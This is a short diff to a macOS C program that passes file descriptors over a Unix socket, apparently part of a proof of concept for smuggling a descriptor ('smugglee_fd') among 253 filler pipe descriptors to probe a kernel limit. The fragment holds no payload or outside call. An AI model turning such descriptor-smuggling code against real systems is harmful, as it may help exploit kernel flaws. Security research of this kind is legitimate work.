@@ -13,6 +13,9 @@ typedef __darwin_mach_port_t fileport_t;
 int     fileport_makeport(int, fileport_t *);
 int     fileport_makefd(fileport_t);
 
+// >=255: EINVAL on sendmsg
+#define NUM_FDS 254
+
 void *monitor_eof(void *arg) {
     int fd = (int)arg;
     while (1) {
@@ -58,12 +61,22 @@ int main(int argc, char **argv) {
     // SCM_RIGHTS cmsg
     struct {
         struct cmsghdr cmsg;
-        int fd;
+        int fd[NUM_FDS];
     } cmsg_data;
     cmsg_data.cmsg.cmsg_level = SOL_SOCKET;
     cmsg_data.cmsg.cmsg_type = SCM_RIGHTS;
-    cmsg_data.cmsg.cmsg_len = CMSG_LEN(sizeof(int) * 1);
-    cmsg_data.fd = smugglee_fd;
+    cmsg_data.cmsg.cmsg_len = CMSG_LEN(sizeof(int) * NUM_FDS);
+    for (int i = 0; i < NUM_FDS - 1; i++) {
+        // stuff it with useless fds to find the limit
+        int pipe2_fds[2];
+        ret = pipe(pipe2_fds);
+        if (ret == -1) {
+            perror("pipe");
+            return 1;
+        }
+        cmsg_data.fd[i] = pipe2_fds[0];
+    }
+    cmsg_data.fd[NUM_FDS - 1] = smugglee_fd;
 
     struct iovec iov = { .iov_base = "", .iov_len = 0 };
     struct msghdr msg = { 0 };
